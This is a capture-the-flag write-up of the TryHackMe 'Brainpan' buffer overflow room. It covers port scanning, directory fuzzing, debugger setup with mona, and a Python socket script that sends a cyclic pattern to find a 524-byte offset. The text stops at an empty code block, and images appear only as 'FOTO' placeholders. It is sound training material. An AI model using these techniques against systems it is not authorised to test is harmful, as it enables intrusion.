---
title: Brainpan Tryhackme Writeup
published: true
---

Today I bring you the writeup of [Brainpan](https://tryhackme.com/room/brainpan), a tryhackme machine focused on Buffer Overflow, here we go!

First we start with a port scan to see which ports are open.

```shell
nmap -sC -sV -p- --min-rate 5000 IP
```

With -p- we indicate that we want it to look at all ports,  -sC we indicate that we want to run the default nmap scripts, -sV to get the service versions and the --min-rate 5000 to do it very fast.

FOTO

It has two open ports, one web and something we don't know what it is, let's connect via netcat to that port.

```shell
nc IP 9999
```

FOTO

It looks like the program with which we have to do the BoF; now let's go to the web.

FOTO

There doesn't seem to be much, let's do some directory fuzzing to see if there is anything we don't see.

```shell
ffuf -w WORDLIST:FUZZ -u http://IP/FUZZ -t THREADS
```

Where it says WORDLIST put the path of the wordlist, in IP put the IP of the target and in THREADS the threads that we want to put, the more threads, the faster.

We get a /bin, let's see what it is.

FOTO

Let's check which architecture it is to open it with x32 or x64

FOTO 6

Ok, looks like the 9999 port binary to exploit it locally before going to the app; let's download it and exploit it on windows with [x64dbg](https://github.com/therealdreg/x64dbg-exploiting/releases/download/1.1/x64dbg-exploitingv1.1.zip), by the way, I have several [demos](https://github.com/therealdreg/x64dbg-exploiting) made in the official repo.

To install the x64dbg with plugins and so on we have to follow the [instructions](https://github.com/therealdreg/x64dbg-exploiting) of the official repo.

FOTO 7-11

Make sure to create the logs folder inside C:

FOTO 5

To configure the logs folder we have to put the following:

```shell
mona.mona("config -set workingfolder c:\\logs\\%p")
```

FOTO

If the previous commands were successful, it should look like this

FOTO

Now hit File->Open and select the vulnerable program

FOTO

FOTO

Click two times on the Run icon to open the program

FOTO

FOTO

Perfect, let's start with the attack, first we must find out how many characters we have to put to overflow the stack; to do this, without leaving the log we put the following command:

```shell
mona.mona("pattern_create 1000")
```

FOTO

Copy the output of the command and paste it into a .txt file

FOTO

Now let's start the script to do our local testing:

```python
import socket
import time
import sys

target = '127.0.0.1'
port = 9999

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.send((buffer))
s.close()
```

FOTO

Now execute the exploit.

FOTO 22

Once finished, we go to log and type the following command to find out the offset needed for the bof

```shell
mona.mona("pattern_offset EIP")
```

FOTO

FOTO 23

FOTO 24

As we can see, it tells us that there are 524 characters, taking this into account, let's modify the script:

```python
buffer = '\x41' * 524
```

FOTO

For now our script only has the overflow characters, now we have to find out the badchars for the shellcode

First we go to log and put this:

```shell
mona.mona("bytearray")
```

FOTO

FOTO

We copy the characters and insert them at the end of the script like this:

```python

```
